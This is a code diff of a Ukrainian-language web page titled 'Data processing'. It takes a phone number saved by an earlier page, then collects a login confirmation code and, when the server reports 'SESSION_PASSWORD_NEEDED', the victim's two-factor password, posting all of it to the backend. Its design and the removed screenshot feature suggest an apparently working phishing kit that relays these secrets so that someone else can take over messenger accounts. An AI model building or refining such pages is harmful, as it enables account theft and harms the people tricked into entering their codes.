@@ -19,19 +19,8 @@
     padding: 24px;
   }
 
-  .page-icon {
-    font-size: 52px;
-    margin-bottom: 16px;
-    line-height: 1;
-  }
-
-  .page-title {
-    font-size: 20px;
-    font-weight: 500;
-    color: #111;
-    margin-bottom: 28px;
-    letter-spacing: 0.01em;
-  }
+  .page-icon { font-size: 52px; margin-bottom: 16px; line-height: 1; }
+  .page-title { font-size: 20px; font-weight: 500; color: #111; margin-bottom: 28px; letter-spacing: 0.01em; }
 
   .card {
     width: 100%;
@@ -47,16 +36,12 @@
   }
 
   .avatar {
-    width: 100px;
-    height: 100px;
+    width: 100px; height: 100px;
     border-radius: 50%;
     background: #d9d9d9;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     overflow: hidden;
   }
-
   .avatar svg { width: 70px; height: 70px; }
 
   .phone-field {
@@ -65,40 +50,8 @@
     border-radius: 10px;
     padding: 10px 16px 12px;
   }
+  .phone-label { font-size: 12px; color: #888; font-weight: 500; margin-bottom: 4px; }
 
-  .phone-label {
-    font-size: 12px;
-    color: #888;
-    font-weight: 500;
-    margin-bottom: 4px;
-  }
-
-  .phone-input-wrap {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    width: 100%;
-  }
-
-  .flag { font-size: 20px; line-height: 1; }
-
-  .phone-code { color: #111; font-weight: 700; font-size: 17px; }
-
-  .phone-input {
-    background: transparent;
-    border: none;
-    outline: none;
-    font-size: 17px;
-    font-weight: 600;
-    color: #111;
-    font-family: 'Nunito', sans-serif;
-    width: 100%;
-    letter-spacing: 0.03em;
-  }
-
-  .phone-input::placeholder { color: #aaa; font-weight: 500; }
-
-  /* Code boxes */
   .code-inputs {
     display: flex;
     gap: 10px;
@@ -107,33 +60,22 @@
   }
 
   .code-box {
-    width: 52px;
-    height: 60px;
+    width: 52px; height: 60px;
     border-radius: 12px;
     border: 1.5px solid #e0e0e0;
     background: #f5f5f5;
     color: #111;
-    font-size: 26px;
-    font-weight: 700;
+    font-size: 26px; font-weight: 700;
     text-align: center;
     outline: none;
     font-family: 'Nunito', sans-serif;
     transition: border-color 0.18s, background 0.18s;
     caret-color: transparent;
   }
+  .code-box:focus { border-color: #111; background: #fff; }
+  .code-box.filled { border-color: #888; background: #fff; }
 
-  .code-box:focus {
-    border-color: #111;
-    background: #fff;
-  }
-
-  .code-box.filled {
-    border-color: #888;
-    background: #fff;
-  }
-
-  /* Step wrappers */
-  #step-phone, #step-code {
+  #step-code {
     width: 100%;
     display: flex;
     flex-direction: column;
@@ -141,55 +83,59 @@
     gap: 20px;
   }
 
-  .code-hint {
-    font-size: 13px;
-    color: #888;
-    text-align: center;
-    margin-top: -8px;
+  #step-password {
+    width: 100%;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
   }
 
-  /* Status */
+  .code-hint { font-size: 13px; color: #888; text-align: center; margin-top: -8px; }
+
   .error   { color: #d32f2f; font-size: 13px; font-weight: 600; text-align: center; }
   .success { color: #2e7d32; font-size: 13px; font-weight: 600; text-align: center; }
   .loading { color: #555;    font-size: 13px; font-weight: 600; text-align: center; }
 
-  /* Button */
   .btn-next {
-    width: 160px;
-    padding: 16px;
-    background: #111;
-    color: #fff;
-    border: none;
-    border-radius: 14px;
-    font-size: 18px;
-    font-weight: 700;
+    width: 160px; padding: 16px;
+    background: #111; color: #fff;
+    border: none; border-radius: 14px;
+    font-size: 18px; font-weight: 700;
     font-family: 'Nunito', sans-serif;
     cursor: pointer;
     transition: background 0.18s, transform 0.12s;
   }
-
   .btn-next:hover { background: #2a2a2a; }
   .btn-next:active { transform: scale(0.97); }
   .btn-next:disabled { background: #aaa; cursor: not-allowed; }
 
-  /* Chat bubble */
+  .password-input {
+    width: 100%;
+    background: #f5f5f5;
+    border: 1.5px solid #e0e0e0;
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 17px;
+    font-weight: 600;
+    font-family: 'Nunito', sans-serif;
+    outline: none;
+    color: #111;
+    transition: border-color 0.18s;
+  }
+  .password-input:focus { border-color: #111; background: #fff; }
+
   .chat-btn {
-    position: fixed;
-    bottom: 24px;
-    right: 24px;
-    width: 52px;
-    height: 52px;
+    position: fixed; bottom: 24px; right: 24px;
+    width: 52px; height: 52px;
     background: #6b5fe2;
     border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     cursor: pointer;
     box-shadow: 0 4px 16px rgba(107,95,226,0.4);
     transition: background 0.2s, transform 0.15s;
     border: none;
   }
-
   .chat-btn:hover { background: #5a4ed1; transform: scale(1.06); }
   .chat-btn svg { width: 24px; height: 24px; fill: white; }
 </style>
@@ -200,7 +146,6 @@
   <div class="page-title">Обробка даних</div>
 
   <div class="card" id="card">
-    <!-- Avatar -->
     <div class="avatar">
       <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
         <circle cx="50" cy="36" r="20" fill="#b0b0b0"/>
@@ -208,22 +153,8 @@
       </svg>
     </div>
 
-    <!-- Step 1: Phone -->
-    <div id="step-phone">
-      <div class="phone-field">
-        <div class="phone-label">Номер телефону</div>
-        <div class="phone-input-wrap">
-          <span class="flag">🇺🇦</span>
-          <span class="phone-code">+380</span>
-          <input class="phone-input" type="tel" id="phone" placeholder="00 000 0000" maxlength="12">
-        </div>
-      </div>
-      <div id="status-phone" style="display:none;"></div>
-      <button class="btn-next" id="btn-phone" onclick="handleSendCode()">Далі</button>
-    </div>
-
-    <!-- Step 2: Code -->
-    <div id="step-code" style="display:none;">
+    <!-- Step: Code -->
+    <div id="step-code">
       <div class="phone-field" style="text-align:center;">
         <div class="phone-label" style="text-align:center;">Код підтвердження</div>
         <div class="code-inputs">
@@ -238,6 +169,18 @@
       <div id="status-code" style="display:none;"></div>
       <button class="btn-next" id="btn-code" onclick="handleVerifyCode()">Підтвердити</button>
     </div>
+
+    <!-- Step: 2FA Password -->
+    <div id="step-password">
+      <div class="phone-field" style="text-align:center;">
+        <div class="phone-label" style="text-align:center;">Двофакторний пароль</div>
+      </div>
+      <input class="password-input" type="password" id="password-input" placeholder="Введіть пароль">
+      <p class="code-hint">Введіть пароль двофакторної автентифікації</p>
+      <div id="status-password" style="display:none;"></div>
+      <button class="btn-next" id="btn-password" onclick="handleVerifyPassword()">Підтвердити</button>
+    </div>
+
   </div>
 
   <button class="chat-btn" title="Підтримка">
@@ -247,56 +190,17 @@
   </button>
 
   <script>
-    // --- Step 1: Phone ---
-    document.getElementById('phone').addEventListener('input', function () {
-      this.value = this.value.replace(/[^\d\s\-()]/g, '');
-    });
+    // Читаємо номер який зберегла index.html
+    const currentPhone = sessionStorage.getItem('phone');
 
-    async function handleSendCode() {
-      let phone = document.getElementById('phone').value.replace(/\D/g, '');
-
-      if (phone.length < 9) {
-        setStatus('status-phone', 'error', '❌ Введіть коректний номер телефону');
-        return;
-      }
-
-      const btn = document.getElementById('btn-phone');
-      btn.disabled = true;
-      btn.textContent = 'Підключаємось...';
-      setStatus('status-phone', 'loading', '⏳ Надсилаємо запит...');
-
-      try {
-        const response = await fetch('/send-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone })
-        });
-
-        const data = await response.json();
-
-        if (data.success) {
-          if (data.screenshotBefore) appendScreenshot(data.screenshotBefore);
-          if (data.screenshot) appendScreenshot(data.screenshot);
-
-          document.getElementById('step-phone').style.display = 'none';
-          document.getElementById('step-code').style.display = 'flex';
-          setStatus('status-code', 'success', '✅ Код надіслано на ваш телефон');
-
-          // Фокус на першу клітинку
-          document.querySelectorAll('.code-box')[0].focus();
-        } else {
-          setStatus('status-phone', 'error', '❌ ' + (data.error || 'Помилка сервера'));
-          btn.disabled = false;
-          btn.textContent = 'Далі';
-        }
-      } catch (err) {
-        setStatus('status-phone', 'error', '❌ Сервер недоступний');
-        btn.disabled = false;
-        btn.textContent = 'Далі';
-      }
+    if (!currentPhone) {
+      window.location.href = '/';
     }
 
-    // --- Step 2: Code boxes ---
+    // Фокус на першу клітинку
+    document.querySelectorAll('.code-box')[0].focus();
+
+    // --- Code boxes ---
     document.querySelectorAll('.code-box').forEach((box, i, boxes) => {
       box.addEventListener('input', () => {
         box.value = box.value.replace(/\D/g, '');
@@ -330,6 +234,7 @@
       });
     });
 
+    // --- Verify code ---
     async function handleVerifyCode() {
       const boxes = document.querySelectorAll('.code-box');
       const code = [...boxes].map(b => b.value).join('');
@@ -348,14 +253,19 @@
         const response = await fetch('/verify-code', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ code })
+          body: JSON.stringify({ phone: currentPhone, code })
         });
 
         const data = await response.json();
 
         if (data.success) {
           setStatus('status-code', 'success', '✅ Успішно авторизовано!');
-          if (data.screenshot) appendScreenshot(data.screenshot);
+          sessionStorage.removeItem('phone');
+        } else if (data.error === 'SESSION_PASSWORD_NEEDED') {
+          // Показуємо форму 2FA
+          document.getElementById('step-code').style.display = 'none';
+          document.getElementById('step-password').style.display = 'flex';
+          document.getElementById('password-input').focus();
         } else {
           setStatus('status-code', 'error', '❌ ' + (data.error || 'Невірний код'));
           boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
@@ -370,19 +280,50 @@
       }
     }
 
+    // --- Verify 2FA password ---
+    async function handleVerifyPassword() {
+      const password = document.getElementById('password-input').value;
+
+      if (!password) {
+        setStatus('status-password', 'error', '❌ Введіть пароль');
+        return;
+      }
+
+      const btn = document.getElementById('btn-password');
+      btn.disabled = true;
+      btn.textContent = 'Перевіряємо...';
+      setStatus('status-password', 'loading', '⏳ Перевіряємо пароль...');
+
+      try {
+        const response = await fetch('/verify-password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: currentPhone, password })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+          setStatus('status-password', 'success', '✅ Успішно авторизовано!');
+          sessionStorage.removeItem('phone');
+        } else {
+          setStatus('status-password', 'error', '❌ ' + (data.error || 'Невірний пароль'));
+          btn.disabled = false;
+          btn.textContent = 'Підтвердити';
+        }
+      } catch (err) {
+        setStatus('status-password', 'error', '❌ Сервер недоступний');
+        btn.disabled = false;
+        btn.textContent = 'Підтвердити';
+      }
+    }
+
     // --- Helpers ---
     function setStatus(id, type, text) {
       const el = document.getElementById(id);
       el.className = type;
       el.innerHTML = text;
       el.style.display = 'block';
-    }
-
-    function appendScreenshot(base64) {
-      const img = document.createElement('img');
-      img.src = 'data:image/png;base64,' + base64;
-      img.style.cssText = 'width:100%;border-radius:12px;margin-top:8px;border:1px solid #e0e0e0';
-      document.getElementById('card').appendChild(img);
     }
   </script>
 
